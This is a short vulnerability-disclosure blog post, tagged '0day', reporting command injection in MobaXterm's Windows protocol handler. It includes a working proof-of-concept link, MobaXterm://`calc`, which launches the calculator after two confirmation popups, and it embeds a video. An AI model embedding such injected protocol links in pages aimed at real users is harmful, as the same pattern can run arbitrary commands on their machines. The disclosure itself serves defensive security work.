---
layout: post
title:  "MobaXterm command execution in protocol handler"
date:   2019-09-14 11:33:37 +0100
categories: 0day
---

MobaXterm protocol handler on Windows is vulnerable to command injection.

An attacker can for example craft a web page containing a malicious link that once clicked will trigger a popup that will ask to the user if he/she wants to run MobaXterm to handle the link. If accepted, another popup will appear asking further confirmation, if also this one is accepted command execution is achieved.

``MobaXterm://`calc` ``

Pops the calculator.

PoC: [Click me](MobaXterm://`calc`)

Video:
<iframe width="560" height="315" src="https://www.youtube.com/embed/dMOkJBXVazA" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
